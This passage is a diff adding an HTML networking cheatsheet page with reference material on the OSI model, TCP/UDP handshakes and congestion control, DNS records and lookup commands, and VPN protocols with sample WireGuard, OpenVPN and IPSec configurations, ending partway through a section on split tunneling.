@@ -1,0 +1,1925 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Networking &mdash; Cheatsheet</title>
+  <link rel="stylesheet" href="css/style.css" />
+  <style>
+    .attr-table td:first-child {
+      font-family: 'JetBrains Mono', 'SF Mono', monospace;
+      font-size: 0.77rem;
+      color: #7aa2f7;
+    }
+    .layer-num {
+      display: inline-block;
+      width: 1.6rem;
+      height: 1.6rem;
+      line-height: 1.6rem;
+      text-align: center;
+      border-radius: 50%;
+      font-weight: 700;
+      font-size: 0.68rem;
+      flex-shrink: 0;
+    }
+    .layer-7 { background: rgba(247,118,142,0.15); color: #f7768e; }
+    .layer-6 { background: rgba(187,154,247,0.15); color: #bb9af7; }
+    .layer-5 { background: rgba(122,162,247,0.15); color: #7aa2f7; }
+    .layer-4 { background: rgba(158,206,106,0.15); color: #9ece6a; }
+    .layer-3 { background: rgba(224,175,104,0.15); color: #e0af68; }
+    .layer-2 { background: rgba(129,140,248,0.15); color: #818cf8; }
+    .layer-1 { background: rgba(113,182,204,0.15); color: #71b6cc; }
+    .osi-card {
+      display: flex;
+      align-items: flex-start;
+      gap: 0.85rem;
+      padding: 0.75rem 1rem;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow-sm);
+      transition: box-shadow 0.2s, transform 0.15s;
+      margin-bottom: 0.5rem;
+    }
+    .osi-card:hover { box-shadow: var(--shadow-md); transform: translateY(-1px); }
+    .osi-body { flex: 1; }
+    .osi-name {
+      font-size: 0.83rem;
+      font-weight: 700;
+      color: var(--text);
+      margin-bottom: 0.2rem;
+    }
+    .osi-desc {
+      font-size: 0.74rem;
+      color: var(--text-muted);
+      line-height: 1.6;
+    }
+    .osi-protocols {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.25rem;
+      margin-top: 0.35rem;
+    }
+    .proto-tag {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.64rem;
+      font-weight: 600;
+      padding: 0.1rem 0.45rem;
+      border-radius: 99px;
+      background: var(--accent-subtle);
+      color: var(--accent);
+      border: 1px solid var(--accent-subtle-2);
+    }
+    .flow-diagram {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.35rem;
+      padding: 1rem;
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      margin-bottom: 1.25rem;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.72rem;
+      overflow-x: auto;
+      flex-wrap: wrap;
+    }
+    .flow-node {
+      padding: 0.35rem 0.65rem;
+      border-radius: 6px;
+      font-weight: 600;
+      white-space: nowrap;
+    }
+    .flow-arrow { color: #484f58; font-size: 0.9rem; }
+  </style>
+</head>
+<body>
+
+<button class="sidebar-toggle" id="sidebar-toggle">☰</button>
+<div class="sidebar-overlay" id="sidebar-overlay"></div>
+<aside class="sidebar" id="sidebar">
+  <div class="sidebar-brand">📚 Cheatsheets</div>
+  <div class="search-wrap">
+    <input type="search" id="search" placeholder="Search..." />
+    <kbd class="shortcut-hint">/</kbd>
+  </div>
+  <nav class="sidebar-nav" id="sidebar-nav"></nav>
+  <div class="sidebar-footer">
+    <button class="sidebar-hide-btn" id="sidebar-hide-btn" title="Hide sidebar">◀</button>
+    <button class="theme-btn" id="theme-btn" title="Toggle theme">🌙</button>
+  </div>
+</aside>
+<button class="sidebar-show-btn" id="sidebar-show-btn" title="Show sidebar">▶</button>
+<script src="js/header.js"></script>
+<script>renderHeader('Networking')</script>
+<script>renderSourceLink('Networking')</script>
+
+<main>
+  <div class="page-header">
+    <h1>Networking &amp; Security</h1>
+    <p class="subtitle">Network infrastructure &amp; security quick reference</p>
+    <span id="source-link"></span>
+    <nav class="toc">
+      <a href="#osi">OSI Model</a>
+      <a href="#tcpip">TCP/IP Deep Dive</a>
+      <a href="#dns">DNS</a>
+      <a href="#vpn">VPN</a>
+      <a href="#nat">NAT</a>
+      <a href="#proxy">Proxy</a>
+      <a href="#firewall">Firewalls</a>
+      <a href="#ids-ips">IDS / IPS</a>
+      <a href="#loadbalancer">Load Balancers</a>
+      <a href="#waf">WAF</a>
+    </nav>
+  </div>
+
+
+  <!-- ══ OSI MODEL ════════════════════════════════════════════════════ -->
+  <section id="osi">
+    <h2>OSI Model — 7 Layers</h2>
+
+    <div class="block-desc">
+      <span>The Open Systems Interconnection model defines how data flows across a network, from physical signals to application logic.</span>
+      <a class="w3-link" href="https://www.w3schools.com/tags/ref_networking.asp" target="_blank">W3Schools →</a>
+    </div>
+    <div class="cheat-block">
+      <div class="code-panel">
+        <div class="panel-label">layer overview</div>
+        <pre><span class="c"># Layer 7 — Application</span>
+HTTP, HTTPS, FTP, SMTP, DNS, SSH, Telnet, SNMP, DHCP
+<span class="c">  ↕ User-facing protocols & APIs</span>
+
+<span class="c"># Layer 6 — Presentation</span>
+SSL/TLS, JPEG, PNG, GIF, MPEG, ASCII, EBCDIC
+<span class="c">  ↕ Data formatting & encryption</span>
+
+<span class="c"># Layer 5 — Session</span>
+NetBIOS, RPC, PPTP, SCP, SOCKS
+<span class="c">  ↕ Session management</span>
+
+<span class="c"># Layer 4 — Transport</span>
+TCP, UDP, SCTP
+<span class="c">  ↕ End-to-end delivery & flow control</span>
+
+<span class="c"># Layer 3 — Network</span>
+IP (v4/v6), ICMP, ARP, OSPF, BGP, RIP
+<span class="c">  ↕ Routing & addressing</span>
+
+<span class="c"># Layer 2 — Data Link</span>
+Ethernet (802.3), Wi-Fi (802.11), PPP, MAC
+<span class="c">  ↕ Frames & physical addressing</span>
+
+<span class="c"># Layer 1 — Physical</span>
+Cables (Cat5/6), Fibre, Hubs, NICs, Bluetooth
+<span class="c">  ↕ Raw bit transmission</span></pre>
+      </div>
+      <div class="live-panel">
+        <div class="panel-label">▶ Data journey</div>
+        <div class="live-output">
+          <div class="osi-card" style="border-left:3px solid #f7768e;">
+            <span class="layer-num layer-7">7</span>
+            <div class="osi-body">
+              <div class="osi-name">Application</div>
+              <div class="osi-desc">User interaction — browsers, APIs, email clients.</div>
+              <div class="osi-protocols">
+                <span class="proto-tag">HTTP</span>
+                <span class="proto-tag">DNS</span>
+                <span class="proto-tag">FTP</span>
+                <span class="proto-tag">SMTP</span>
+              </div>
+            </div>
+          </div>
+          <div class="osi-card" style="border-left:3px solid #bb9af7;">
+            <span class="layer-num layer-6">6</span>
+            <div class="osi-body">
+              <div class="osi-name">Presentation</div>
+              <div class="osi-desc">Data encoding, compression, encryption/decryption.</div>
+              <div class="osi-protocols">
+                <span class="proto-tag">TLS</span>
+                <span class="proto-tag">SSL</span>
+                <span class="proto-tag">JPEG</span>
+              </div>
+            </div>
+          </div>
+          <div class="osi-card" style="border-left:3px solid #7aa2f7;">
+            <span class="layer-num layer-5">5</span>
+            <div class="osi-body">
+              <div class="osi-name">Session</div>
+              <div class="osi-desc">Establishes, manages, and terminates connections.</div>
+              <div class="osi-protocols">
+                <span class="proto-tag">NetBIOS</span>
+                <span class="proto-tag">RPC</span>
+              </div>
+            </div>
+          </div>
+          <div class="osi-card" style="border-left:3px solid #9ece6a;">
+            <span class="layer-num layer-4">4</span>
+            <div class="osi-body">
+              <div class="osi-name">Transport</div>
+              <div class="osi-desc">Reliable (TCP) or fast (UDP) end-to-end delivery.</div>
+              <div class="osi-protocols">
+                <span class="proto-tag">TCP</span>
+                <span class="proto-tag">UDP</span>
+                <span class="proto-tag">SCTP</span>
+              </div>
+            </div>
+          </div>
+          <div class="osi-card" style="border-left:3px solid #e0af68;">
+            <span class="layer-num layer-3">3</span>
+            <div class="osi-body">
+              <div class="osi-name">Network</div>
+              <div class="osi-desc">Logical addressing &amp; routing across networks.</div>
+              <div class="osi-protocols">
+                <span class="proto-tag">IP</span>
+                <span class="proto-tag">ICMP</span>
+                <span class="proto-tag">BGP</span>
+                <span class="proto-tag">OSPF</span>
+              </div>
+            </div>
+          </div>
+          <div class="osi-card" style="border-left:3px solid #818cf8;">
+            <span class="layer-num layer-2">2</span>
+            <div class="osi-body">
+              <div class="osi-name">Data Link</div>
+              <div class="osi-desc">Framing, MAC addressing, error detection.</div>
+              <div class="osi-protocols">
+                <span class="proto-tag">Ethernet</span>
+                <span class="proto-tag">Wi-Fi</span>
+                <span class="proto-tag">PPP</span>
+              </div>
+            </div>
+          </div>
+          <div class="osi-card" style="border-left:3px solid #71b6cc;">
+            <span class="layer-num layer-1">1</span>
+            <div class="osi-body">
+              <div class="osi-name">Physical</div>
+              <div class="osi-desc">Bit-level transmission over cables, fibre, or radio.</div>
+              <div class="osi-protocols">
+                <span class="proto-tag">Cat6</span>
+                <span class="proto-tag">Fibre</span>
+                <span class="proto-tag">Bluetooth</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+
+  <!-- ══ TCP/IP DEEP DIVE ════════════════════════════════════════════ -->
+  <section id="tcpip">
+    <h2>TCP/IP — Deep Dive</h2>
+
+    <div class="block-desc">
+      <span>TCP provides reliable, ordered delivery with flow control and congestion management; UDP offers fast, connectionless datagrams.</span>
+      <a class="w3-link" href="https://www.w3schools.com/tags/ref_tcpip.asp" target="_blank">W3Schools →</a>
+    </div>
+    <div class="cheat-block">
+      <div class="code-panel">
+        <div class="panel-label">tcp vs udp comparison</div>
+        <pre><span class="c"># ── TCP (Transmission Control Protocol) ──</span>
+Connection-oriented, reliable, ordered.
+Three-way handshake: SYN → SYN-ACK → ACK
+Flow control: receiver window (rwnd)
+Congestion control: slow start, AIMD, fast retransmit
+Overhead: 20-byte header minimum
+Use: HTTP, SSH, FTP, SMTP, databases
+
+<span class="c"># ── UDP (User Datagram Protocol) ──</span>
+Connectionless, unreliable, no ordering.
+No handshake — fire-and-forget.
+Flow control: none (app-level if needed)
+Congestion control: none (app-level if needed)
+Overhead: 8-byte header
+Use: DNS, VoIP, gaming, video streaming, DHCP
+
+<span class="c"># ── TCP Header Fields (20+ bytes) ──</span>
+Source Port (16)  | Destination Port (16)
+Sequence Number (32)
+Acknowledgment Number (32)
+Data Offset + Flags (SYN,ACK,FIN,RST,PSH,URG)
+Window Size (16) | Checksum (16) | Urgent Ptr (16)
+Options (variable): MSS, Window Scale, SACK
+
+<span class="c"># ── UDP Header (8 bytes) ──</span>
+Source Port (16) | Destination Port (16)
+Length (16)      | Checksum (16)</pre>
+      </div>
+      <div class="live-panel">
+        <div class="panel-label">▶ TCP vs UDP</div>
+        <div class="live-output">
+          <table style="font-size:0.74rem;">
+            <tr><th>Feature</th><th>TCP</th><th>UDP</th></tr>
+            <tr><td style="font-family:monospace;">Connection</td><td>3-way handshake</td><td>Connectionless</td></tr>
+            <tr><td style="font-family:monospace;">Reliability</td><td>Ack + retransmit</td><td>Best-effort only</td></tr>
+            <tr><td style="font-family:monospace;">Ordering</td><td>Sequence numbers</td><td>No guarantee</td></tr>
+            <tr><td style="font-family:monospace;">Flow Control</td><td>Sliding window</td><td>None</td></tr>
+            <tr><td style="font-family:monospace;">Congestion</td><td>Slow start, AIMD</td><td>None built-in</td></tr>
+            <tr><td style="font-family:monospace;">Header Size</td><td>20+ bytes</td><td>8 bytes</td></tr>
+            <tr><td style="font-family:monospace;">Speed</td><td>Slower (overhead)</td><td>Faster (minimal)</td></tr>
+            <tr><td style="font-family:monospace;">Protocols</td><td>HTTP, SSH, FTP</td><td>DNS, VoIP, DHCP</td></tr>
+          </table>
+          <br>
+          <p style="font-size:0.75rem;color:var(--text-muted);line-height:1.8;">
+            <strong>When to use UDP:</strong><br>
+            Latency matters more than reliability.<br>
+            Retransmission is handled at the app layer.<br>
+            Multicast/broadcast is needed (video, gaming).
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div class="block-desc">
+      <span>The TCP three-way handshake establishes a connection; flow control prevents overwhelming the receiver; congestion control prevents network collapse.</span>
+      <a class="w3-link" href="https://www.w3schools.com/tags/ref_tcpip.asp" target="_blank">W3Schools →</a>
+    </div>
+    <div class="cheat-block">
+      <div class="code-panel">
+        <div class="panel-label">handshake &amp; congestion control</div>
+        <pre><span class="c"># ── Three-Way Handshake ──</span>
+Client → Server:  SYN  (seq=x)
+Server → Client:  SYN-ACK (seq=y, ack=x+1)
+Client → Server:  ACK  (ack=y+1)
+Connection established — data flows bidirectionally.
+
+<span class="c"># ── Four-Way Teardown ──</span>
+Client → Server:  FIN  (I'm done sending)
+Server → Client:  ACK  (acknowledged)
+Server → Client:  FIN  (I'm done too)
+Client → Server:  ACK  (final ack)
+TIME_WAIT: client waits 2×MSL before closing
+
+<span class="c"># ── Flow Control (Sliding Window) ──</span>
+Receiver advertises window size (rwnd).
+Sender cannot exceed rwnd bytes unacknowledged.
+rwnd=0 → sender pauses, probes periodically.
+Prevents fast sender from overwhelming slow receiver.
+
+<span class="c"># ── Congestion Control Algorithms ──</span>
+1. Slow Start
+   cwnd = 1 MSS, doubles every RTT
+   Until cwnd ≥ ssthresh
+
+2. Congestion Avoidance
+   cwnd += 1 MSS per RTT (linear growth)
+
+3. Fast Retransmit
+   3 duplicate ACKs → retransmit immediately
+
+4. Fast Recovery (TCP Reno)
+   ssthresh = cwnd/2, cwnd = ssthresh
+   Skip slow start, go to avoidance
+
+5. TCP CUBIC (Linux default)
+   Uses cubic function of time since loss
+   Better for high-bandwidth networks</pre>
+      </div>
+      <div class="live-panel">
+        <div class="panel-label">▶ Handshake flow</div>
+        <div class="live-output">
+          <div class="flow-diagram">
+            <span class="flow-node" style="background:rgba(158,206,106,0.15);color:#9ece6a;">Client</span>
+            <span class="flow-arrow">→ SYN →</span>
+            <span class="flow-node" style="background:rgba(247,118,142,0.15);color:#f7768e;">Server</span>
+          </div>
+          <div class="flow-diagram" style="margin-top:0.25rem;">
+            <span class="flow-node" style="background:rgba(247,118,142,0.15);color:#f7768e;">Server</span>
+            <span class="flow-arrow">→ SYN-ACK →</span>
+            <span class="flow-node" style="background:rgba(158,206,106,0.15);color:#9ece6a;">Client</span>
+          </div>
+          <div class="flow-diagram" style="margin-top:0.25rem;">
+            <span class="flow-node" style="background:rgba(158,206,106,0.15);color:#9ece6a;">Client</span>
+            <span class="flow-arrow">→ ACK →</span>
+            <span class="flow-node" style="background:rgba(247,118,142,0.15);color:#f7768e;">Server</span>
+          </div>
+          <br>
+          <p style="font-size:0.75rem;color:var(--text-muted);line-height:1.8;">
+            <strong>Congestion window growth:</strong><br>
+            Slow start: exponential until ssthresh<br>
+            Avoidance: linear (+1 MSS per RTT)<br>
+            On loss: cut cwnd in half (or cubic)<br><br>
+            <strong>Key concepts:</strong><br>
+            <code>MSS</code> — max segment size (typically 1460B)<br>
+            <code>RTT</code> — round trip time<br>
+            <code>ssthresh</code> — slow start threshold<br>
+            <code>CWND</code> — congestion window<br>
+            <code>RWND</code> — receive window (flow control)
+          </p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+
+  <!-- ══ DNS ═══════════════════════════════════════════════════════════ -->
+  <section id="dns">
+    <h2>DNS — Domain Name System</h2>
+
+    <div class="block-desc">
+      <span>DNS resolves human-readable domain names to IP addresses, using a hierarchical distributed database of record types.</span>
+      <a class="w3-link" href="https://www.w3schools.com/howto/howto_dns.asp" target="_blank">W3Schools →</a>
+    </div>
+    <div class="cheat-block">
+      <div class="code-panel">
+        <div class="panel-label">dns resolution &amp; record types</div>
+        <pre><span class="c"># ── DNS Resolution Process ──</span>
+1. Browser cache → check local DNS cache
+2. OS resolver → /etc/resolv.conf nameserver
+3. Recursive resolver → ISP or public DNS
+4. Root nameserver → delegates to TLD (.com)
+5. TLD nameserver → delegates to authoritative
+6. Authoritative NS → returns IP address
+7. Response cached at each level (TTL)
+
+<span class="c"># ── Record Types ──</span>
+A       — maps domain → IPv4 address
+AAAA    — maps domain → IPv6 address
+CNAME   — alias: domain → another domain
+MX      — mail exchange (priority + server)
+NS      — nameserver for a domain
+TXT     — arbitrary text (SPF, DKIM, verification)
+SRV     — service location (host + port)
+PTR     — reverse DNS: IP → domain
+SOA     — start of authority (zone metadata)
+CAA     — certificate authority authorization
+
+<span class="c"># ── Zone File Example (BIND format) ──</span>
+$ORIGIN example.com.
+@   IN  SOA  ns1.example.com. admin.example.com. (
+            2024071501  <span class="c">; serial (YYYYMMDDnn)</span>
+            3600        <span class="c">; refresh (1 hour)</span>
+            900         <span class="c">; retry (15 min)</span>
+            604800      <span class="c">; expire (1 week)</span>
+            86400       <span class="c">; minimum TTL (1 day)</span>
+        )
+@       IN  NS     ns1.example.com.
+@       IN  A      93.184.216.34
+@       IN  AAAA   2606:2800:220:1:248:1893:25c8:1946
+www     IN  CNAME  example.com.
+@       IN  MX     10  mail.example.com.
+@       IN  TXT    "v=spf1 mx ~all"
+mail    IN  A      93.184.216.50
+
+<span class="c"># ── dig / nslookup commands ──</span>
+dig example.com A          <span class="c"># IPv4 record</span>
+dig example.com MX         <span class="c"># mail records</span>
+dig +short example.com     <span class="c"># concise output</span>
+dig @8.8.8.8 example.com   <span class="c"># query specific DNS</span>
+nslookup example.com       <span class="c"># simple lookup</span></pre>
+      </div>
+      <div class="live-panel">
+        <div class="panel-label">▶ DNS resolution chain</div>
+        <div class="live-output">
+          <div class="flow-diagram">
+            <span class="flow-node" style="background:rgba(158,206,106,0.15);color:#9ece6a;">Client</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(122,162,247,0.15);color:#7aa2f7;">Recursive DNS</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(224,175,104,0.15);color:#e0af68;">Root (.)</span>
+          </div>
+          <div class="flow-diagram" style="margin-top:0.25rem;">
+            <span class="flow-node" style="background:rgba(224,175,104,0.15);color:#e0af68;">.com TLD</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(187,154,247,0.15);color:#bb9af7;">Authoritative NS</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(158,206,106,0.15);color:#9ece6a;">IP Address</span>
+          </div>
+          <br>
+          <table style="font-size:0.74rem;">
+            <tr><th>Record</th><th>Purpose</th><th>Example</th></tr>
+            <tr><td style="font-family:monospace;color:#9ece6a;">A</td><td>Domain → IPv4</td><td>example.com → 93.184.216.34</td></tr>
+            <tr><td style="font-family:monospace;color:#7aa2f7;">AAAA</td><td>Domain → IPv6</td><td>example.com → 2606:2800:... </td></tr>
+            <tr><td style="font-family:monospace;color:#e0af68;">CNAME</td><td>Alias → canonical</td><td>www → example.com</td></tr>
+            <tr><td style="font-family:monospace;color:#bb9af7;">MX</td><td>Mail server</td><td>10 mail.example.com</td></tr>
+            <tr><td style="font-family:monospace;color:#f7768e;">NS</td><td>Nameserver</td><td>ns1.example.com</td></tr>
+            <tr><td style="font-family:monospace;color:#71b6cc;">TXT</td><td>Text / metadata</td><td>"v=spf1 mx ~all"</td></tr>
+            <tr><td style="font-family:monospace;">SRV</td><td>Service + port</td><td>_sip._tcp.example.com</td></tr>
+            <tr><td style="font-family:monospace;">PTR</td><td>Reverse (IP→name)</td><td>34.216.184.93 → example.com</td></tr>
+          </table>
+          <br>
+          <p style="font-size:0.75rem;color:var(--text-muted);line-height:1.8;">
+            <strong>DNS Caching:</strong><br>
+            Browser cache → OS cache → Router → ISP<br>
+            TTL controls how long records are cached.<br>
+            Lower TTL = faster propagation, more queries.<br><br>
+            <strong>DNSSEC:</strong><br>
+            Adds cryptographic signatures to DNS records.<br>
+            Prevents spoofing/poisoning attacks.<br>
+            Uses RRSIG, DNSKEY, DS record types.
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div class="block-desc">
+      <span>DNS configuration with <code>/etc/resolv.conf</code>, <code>/etc/hosts</code>, and common troubleshooting commands.</span>
+      <a class="w3-link" href="https://www.w3schools.com/howto/howto_dns.asp" target="_blank">W3Schools →</a>
+    </div>
+    <div class="cheat-block">
+      <div class="code-panel">
+        <div class="panel-label">dns config &amp; tools</div>
+        <pre><span class="c"># ── /etc/resolv.conf ──</span>
+nameserver 8.8.8.8        <span class="c"># Google DNS</span>
+nameserver 1.1.1.1        <span class="c"># Cloudflare</span>
+nameserver 9.9.9.9        <span class="c"># Quad9</span>
+search example.com        <span class="c"># search domain</span>
+options timeout:2 attempts:3
+
+<span class="c"># ── /etc/hosts (local override) ──</span>
+127.0.0.1   localhost
+192.168.1.10 myserver.local
+
+<span class="c"># ── systemd-resolved ──</span>
+resolvectl status           <span class="c"># show DNS config</span>
+resolvectl query example.com  <span class="c"># resolve</span>
+resolvectl statistics       <span class="c"># cache stats</span>
+
+<span class="c"># ── DNS troubleshooting ──</span>
+dig +trace example.com    <span class="c"># full resolution path</span>
+dig example.com +dnssec   <span class="c"># check DNSSEC</span>
+host example.com          <span class="c"># simple forward lookup</span>
+host 93.184.216.34        <span class="c"># reverse lookup</span>
+<span class="c"># Flush local cache (macOS):</span>
+sudo dscacheutil -flushcache
+sudo killall -HUP mDNSResponder</pre>
+      </div>
+      <div class="live-panel">
+        <div class="panel-label">▶ DNS providers</div>
+        <div class="live-output" style="font-size:0.75rem;color:var(--text-muted);line-height:1.8;">
+          <p><strong>Public DNS servers:</strong></p>
+          <p><span style="color:#9ece6a;font-family:monospace;">8.8.8.8</span> — Google (privacy concerns)</p>
+          <p><span style="color:#7aa2f7;font-family:monospace;">1.1.1.1</span> — Cloudflare (fast, privacy)</p>
+          <p><span style="color:#e0af68;font-family:monospace;">9.9.9.9</span> — Quad9 (security filtering)</p>
+          <p><span style="color:#bb9af7;font-family:monospace;">208.67.222.222</span> — OpenDNS</p>
+          <br>
+          <p><strong>Over-encrypted DNS:</strong></p>
+          <p><span style="color:#71b6cc;font-family:monospace;">DoH</span> — DNS over HTTPS (port 443)</p>
+          <p><span style="color:#71b6cc;font-family:monospace;">DoT</span> — DNS over TLS (port 853)</p>
+          <p>Prevents ISP snooping &amp; manipulation</p>
+          <br>
+          <p><strong>Common issues:</strong></p>
+          <p>• <code>NXDOMAIN</code> — domain doesn't exist</p>
+          <p>• <code>SERVFAIL</code> — DNS server failure</p>
+          <p>• <code>REFUSED</code> — server won't answer</p>
+          <p>• Stale cache → wrong IP after DNS change</p>
+          <p>• Check with <code>dig +noall +answer</code></p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+
+  <!-- ══ VPN ═══════════════════════════════════════════════════════════ -->
+  <section id="vpn">
+    <h2>VPN — Virtual Private Network</h2>
+
+    <div class="block-desc">
+      <span>VPN creates an encrypted tunnel over a public network to securely connect remote sites or users.</span>
+      <a class="w3-link" href="https://www.w3schools.com/tags/ref_tcpip.asp" target="_blank">W3Schools →</a>
+    </div>
+    <div class="cheat-block">
+      <div class="code-panel">
+        <div class="panel-label">vpn types &amp; protocols</div>
+        <pre><span class="c"># ── Site-to-Site VPN ──</span>
+Connects two entire networks (e.g., HQ ↔ branch office).
+Uses gateway-to-gateway tunneling.
+Protocols: IPSec, WireGuard, OpenVPN
+
+<span class="c"># ── Remote Access VPN ──</span>
+Connects individual users to a private network.
+Used by employees working from home.
+Protocols: OpenVPN, L2TP/IPSec, IKEv2, WireGuard
+
+<span class="c"># ── Common VPN Protocols ──</span>
+OpenVPN    — open source, TLS-based, very flexible
+L2TP/IPSec — double encapsulation, widely supported
+IKEv2      — fast reconnection, great for mobile
+WireGuard  — modern, lightweight, very fast
+PPTP       — legacy, <span class="c">insecure, avoid</span>
+
+<span class="c"># ── Encryption Layers ──</span>
+AES-256-GCM  — symmetric encryption (data)
+RSA-2048/4096 — asymmetric key exchange
+SHA-256/512   — hash integrity verification
+ECDHE         — perfect forward secrecy</pre>
+      </div>
+      <div class="live-panel">
+        <div class="panel-label">▶ VPN protocol comparison</div>
+        <div class="live-output">
+          <table>
+            <tr><th>Protocol</th><th>Speed</th><th>Security</th><th>Mobile</th><th>Use Case</th></tr>
+            <tr><td style="font-family:monospace;font-size:0.75rem;color:#9ece6a;">WireGuard</td><td>★★★★★</td><td>★★★★☆</td><td>★★★★★</td><td>Modern default</td></tr>
+            <tr><td style="font-family:monospace;font-size:0.75rem;color:#9ece6a;">OpenVPN</td><td>★★★★☆</td><td>★★★★★</td><td>★★★☆☆</td><td>Enterprise / self-hosted</td></tr>
+            <tr><td style="font-family:monospace;font-size:0.75rem;color:#9ece6a;">IKEv2</td><td>★★★★☆</td><td>★★★★☆</td><td>★★★★★</td><td>Mobile, seamless roaming</td></tr>
+            <tr><td style="font-family:monospace;font-size:0.75rem;color:#9ece6a;">L2TP/IPSec</td><td>★★★☆☆</td><td>★★★★☆</td><td>★★★☆☆</td><td>Legacy, broad support</td></tr>
+            <tr><td style="font-family:monospace;font-size:0.75rem;color:#f7768e;">PPTP</td><td>★★★★☆</td><td>★☆☆☆☆</td><td>★★★☆☆</td><td style="color:#f7768e;">Avoid — broken</td></tr>
+          </table>
+          <br>
+          <p style="font-size:0.75rem;color:var(--text-muted);line-height:1.8;">
+            <strong>Recommendation:</strong><br>
+            Use <strong>WireGuard</strong> for new deployments.<br>
+            Use <strong>OpenVPN</strong> for maximum compatibility.<br>
+            Use <strong>IKEv2</strong> for mobile-first setups.<br>
+            Never use <strong>PPTP</strong> — cracked since 2012.
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div class="block-desc">
+      <span>VPN encryption stack: how <code>AES</code>, <code>RSA</code>, and <code>SHA</code> work together in a secure tunnel.</span>
+      <a class="w3-link" href="https://www.w3schools.com/tags/ref_networking.asp" target="_blank">W3Schools →</a>
+    </div>
+    <div class="cheat-block">
+      <div class="code-panel">
+        <div class="panel-label">vpn encryption stack</div>
+        <pre><span class="c"># ── Handshake Phase ──</span>
+Client ←→ Server key exchange
+RSA or ECDHE authenticates server identity
+ECDHE provides perfect forward secrecy (PFS)
+
+<span class="c"># ── Tunnel Established ──</span>
+AES-256-GCM encrypts all data in transit
+SHA-512 verifies packet integrity
+
+<span class="c"># ── WireGuard example (wg0.conf) ──</span>
+[Interface]
+PrivateKey = <span style="color:#9ece6a">xxxxxxxxxxxx...</span>
+Address    = 10.0.0.2/24
+DNS        = 1.1.1.1
+
+[Peer]
+PublicKey  = yyyyyyyyyyyy...
+Endpoint   = vpn.example.com:51820
+AllowedIPs = 0.0.0.0/0
+
+<span class="c"># ── OpenVPN config example ──</span>
+client
+dev tun
+proto udp
+remote vpn.example.com 1194
+cipher AES-256-GCM
+auth SHA512
+resolv-retry infinite
+nobind
+persist-key
+persist-tun
+
+<span class="c"># ── IPSec (IKEv2) config (ipsec.conf) ──</span>
+conn corp-vpn
+    keyexchange=ikev2
+    left=%defaultroute
+    leftauth=pubkey
+    right=vpn.example.com
+    rightauth=pubkey
+    rightsubnet=0.0.0.0/0
+    ike=aes256-sha256-ecp384!
+    esp=aes256-sha256!
+    auto=start</pre>
+      </div>
+      <div class="live-panel">
+        <div class="panel-label">▶ VPN tunnel flow</div>
+        <div class="live-output">
+          <div class="flow-diagram">
+            <span class="flow-node" style="background:rgba(158,206,106,0.15);color:#9ece6a;">Your Device</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(122,162,247,0.15);color:#7aa2f7;">Encrypt (AES)</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(224,175,104,0.15);color:#e0af68;">VPN Tunnel</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(187,154,247,0.15);color:#bb9af7;">Decrypt</span>
+            <span class="flow-arrow">→</span>
+            <span class="flow-node" style="background:rgba(247,118,142,0.15);color:#f7768e;">Destination</span>
+          </div>
+          <br>
+          <p style="font-size:0.75rem;color:var(--text-muted);line-height:1.8;">
+            <strong>What the ISP sees:</strong><br>
+            Encrypted packets → VPN server IP only.<br>
+            Actual destination is hidden.<br><br>
+            <strong>Use cases:</strong><br>
+            • Remote work access to corporate LAN<br>
+            • Secure public Wi-Fi usage<br>
+            • Geo-restriction bypass<br>
+            • Privacy &amp; anonymity online
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div class="block-desc">
+      <span><strong>Split tunneling</strong> routes some traffic through VPN and some directly; <strong>full tunneling</strong> sends everything through the VPN.</span>
+      <a class="w3-link" href="https://www.w3schools.com/tags/ref_tcpip.asp" target="_blank">W3Schools →</a>
+    </div>
+    <div class="cheat-block">
+      <div class="code-panel">
+        <div class="panel-label">split vs full tunneling</div>
+        <pre><span class="c"># ── Full Tunnel ──</span>
+ALL traffic routes through VPN.
+Maximum security — ISP sees nothing.
+Higher VPN bandwidth usage &amp; latency.
+Best for: high-security environments.
+
+<span class="c"># ── Split Tunnel ──</span>
+Only corporate traffic goes through VPN.
+Internet traffic goes directly (no VPN).
+Lower bandwidth, lower latency.
+Best for: remote work with local resources.
+
+<span class="c"># ── WireGuard split tunnel (wg0.conf) ──</span>
+<span class="c"># Full tunnel:</span>
+AllowedIPs = 0.0.0.0/0, ::/0
+
+<span class="c"># Split tunnel — only company subnets:</span>
+AllowedIPs = 10.0.0.0/8, 172.16.0.0/12
+
+<span class="c"># ── OpenVPN split tunnel ──</span>
+<span class="c"># Server config:</span>
+push "route 10.0.0.0 255.0.0.0"
+push "route 172.16.0.0 255.240.0.0"
+push "redirect-gateway def1 bypass-dhcp"
+
+<span class="c"># ── Remote Access vs Site-to-Site ──</span>
+<span class="c"># Remote Access:</span>
+  Individual device → VPN server → LAN
+  Protocols: OpenVPN, IKEv2, WireGuard
+  Use: employee laptop → office network
+
+<span class="c"># Site-to-Site:</span>
+  Router/Gateway ↔ Router/Gateway
+  Entire networks bridged transparently
+  Protocols: IPSec, WireGuard
+  Use: HQ ↔ branch office connectivity</pre>
+      </div>
+      <div class="live-panel">
+        <div class="panel-label">▶ Tunnel types</div>
+        <div class="live-output">
+          <div class="flow-diagram">
